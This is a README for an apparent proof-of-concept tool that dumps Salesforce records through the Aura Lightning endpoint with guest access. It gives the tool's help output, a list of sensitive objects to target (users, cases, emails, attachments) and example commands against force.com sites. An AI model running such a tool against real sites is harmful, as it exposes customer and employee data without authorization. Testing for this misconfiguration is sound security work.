# PoC for Salesforce lightning
***Academic purposes Only***. 

This tool dumps the data of Salesforce object through Aura lightning endpoint with the guest privilege.

# Requirement
- Python3 

# Usage
```
$ python exploit.py -h
usage: exploit.py [-h] -u URL [-o [OBJECTS [OBJECTS ...]]] [-l] [-c]
                  [-a AURA_CONTEXT]

Exploit Salesforce through the aura endpoint with the guest privilege

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     set the SITE url. e.g. http://url/site_path
  -o [OBJECTS [OBJECTS ...]], --objects [OBJECTS [OBJECTS ...]]
                        set the object name. Default value is "User" object.
                        Juicy Objects: Case,Account,User,Contact,Document,Cont
                        entDocument,ContentVersion,ContentBody,CaseComment,Not
                        e,Employee,Attachment,EmailMessage,CaseExternalDocumen
                        t,Attachment,Lead,Name,EmailTemplate,EmailMessageRelat
                        ion
  -l, --listobj         pull the custom object list.
  -c, --check           only check aura endpoint
  -a AURA_CONTEXT, --aura_context AURA_CONTEXT
                        set your valid aura_context

$ python exploit.y -u https://domain.force.com/sitepath -l
$ python exploit.y -u https://domain.force.com/sitepath -o User Account
```

# Reference
- Salesforce Lightning - An in-depth look at exploitation vectors for the everyday community
  - https://www.enumerated.de/index/salesforce
